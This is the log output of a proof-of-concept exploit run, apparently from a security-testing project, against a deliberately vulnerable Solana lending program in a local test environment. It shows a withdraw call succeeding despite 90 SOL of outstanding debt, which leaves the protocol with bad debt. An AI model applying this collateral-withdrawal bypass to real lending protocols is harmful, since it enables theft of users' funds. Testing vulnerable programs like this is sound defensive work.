═══════════════════════════════════════════════════════════
 EXPLOIT: Withdraw Drain (SEM-002)
 Target: vulnerable_lending::withdraw()
 Binary: vuln_lending.so (compiled SBF)
═══════════════════════════════════════════════════════════

[2026-02-13T19:19:35.103925497Z INFO  solana_program_test] "vuln_lending" SBF program from /home/user/anchor-shield-v2/exploits/vuln_lending.so, modified 6 minutes, 860 ms, 379 µs and 372 ns ago
[1] State setup (simulates: attacker deposited 100, borrowed 90):
    Pool: deposits=600 SOL, borrows=90 SOL
    User: deposited=100 SOL, borrowed=90 SOL
    Vault: 510 SOL

[2] EXPLOIT: Withdrawing 100 SOL despite 90 SOL outstanding debt...
[2026-02-13T19:19:35.786213042Z DEBUG solana_runtime::message_processor::stable_log] Program BJYyF44xEVBfZDQwRdQ2d2ErjWoESsgaXHVcSw7MAv8K invoke [1]
[2026-02-13T19:19:35.787088297Z DEBUG solana_runtime::message_processor::stable_log] Program log: Instruction: Withdraw
[2026-02-13T19:19:35.787222091Z DEBUG solana_runtime::message_processor::stable_log] Program 11111111111111111111111111111111 invoke [2]
[2026-02-13T19:19:35.787395012Z DEBUG solana_runtime::message_processor::stable_log] Program 11111111111111111111111111111111 success
[2026-02-13T19:19:35.787873132Z DEBUG solana_runtime::message_processor::stable_log] Program BJYyF44xEVBfZDQwRdQ2d2ErjWoESsgaXHVcSw7MAv8K consumed 6331 of 200000 compute units
[2026-02-13T19:19:35.787932687Z DEBUG solana_runtime::message_processor::stable_log] Program BJYyF44xEVBfZDQwRdQ2d2ErjWoESsgaXHVcSw7MAv8K success
    Withdrawal SUCCEEDED (should have been blocked)

[3] Reading final account state...
    Deposited (on-chain): 0 SOL
    Borrowed (outstanding): 90 SOL
    Collateral remaining: 0 SOL
    Attacker SOL gained: 100.0000 SOL

═══════════════════════════════════════════════════════════
 >>> EXPLOIT CONFIRMED on compiled SBF binary <<<
 Deposited 100 SOL -> Borrowed 90 SOL -> Withdrew 100 SOL
 Protocol has 90 SOL bad debt with 0 collateral
 Attacker gained ~100.0 SOL net (90 SOL stolen)
═══════════════════════════════════════════════════════════
EXIT CODE: 
EXIT CODE: 0
